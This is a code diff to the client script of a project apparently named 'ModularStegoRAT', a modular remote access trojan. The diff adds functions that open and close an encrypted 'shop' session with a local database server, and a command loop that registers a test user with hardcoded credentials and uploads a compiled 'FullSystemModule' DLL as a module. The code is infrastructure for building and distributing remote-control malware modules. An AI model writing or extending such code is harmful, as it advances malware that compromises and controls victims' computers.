@@ -14,6 +14,8 @@ DATABASE_CONNECTION_HOST = "127.0.0.1"
 DATABASE_CONNECTION_PORT = 12345
 KEYFILE_PATH = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Python"
 DB_INIT_SIZE_BYTES = 1024
+DB_SHOP_SIZE_BYTES_CLIENT = 1024
+DB_SHOP_SIZE_BYTES_SERVER = 8192
 
 def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
     oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
@@ -183,14 +185,61 @@ def UploadNewModule(moduleName : str, DLLPath : str, description : str, username
         
     dbSocket.shutdown(socket.SHUT_RDWR)
     dbSocket.close()
-        
 
-DefineNewUser("TestUser", "TestPass")
-UploadNewModule(
-    "TestMod1", 
-    "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Modules\\FullSystemModule\\x64\\Debug\\FullSystemModule.dll", 
-    "This is a test mod", 
-    "TestUser", 
-    "TestPass", 
-    publicKeyBytes, 
-    "")
+def StartShop() -> tuple[AESGCM, socket.socket, bytes]:
+    aes, dbSocket = InitServerConnection()
+    
+    seedNonce = os.urandom(12)
+    request = json.dumps({
+        "Nonce": base64.b64encode(seedNonce).decode(), 
+        "Type" : base64.b64encode(aes.encrypt(seedNonce, "OPEN_SHOP".encode(), None)).decode(),
+    })
+    
+    request = request.encode().ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    dbSocket.send(request)
+    
+    return (aes, dbSocket, seedNonce)
+
+def CloseShop(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int):    
+    request = json.dumps({
+        "Type" : "CLOSE_SHOP"
+    }).encode()
+    
+    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    shopSocket.send(request)
+    
+    shopSocket.shutdown(socket.SHUT_RDWR)
+    shopSocket.close()
+
+running = True
+shopping = False
+
+while running:
+    userInput = input()
+    if(userInput == ".define" and (not shopping)):
+        DefineNewUser("TestUser", "TestPass")
+    
+    elif(userInput == ".upload" and (not shopping)):
+        UploadNewModule(
+            "TestMod1", 
+            "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Modules\\FullSystemModule\\x64\\Debug\\FullSystemModule.dll", 
+            "This is a test mod", 
+            "TestUser", 
+            "TestPass", 
+            publicKeyBytes, 
+            "")
+
+    elif(userInput == ".openShop" and (not shopping)):
+        shopAES, shopSocket, shopSeedNonce = StartShop()
+        shopSeedNonceIncrement = 1
+        shopping = True
+    
+    elif(userInput == ".closeShop" and shopping):
+        CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
+        shopping = False
+    
+    elif(userInput == ".quit"):
+        running = False
+        if(shopping):
+            CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
+            shopping = False
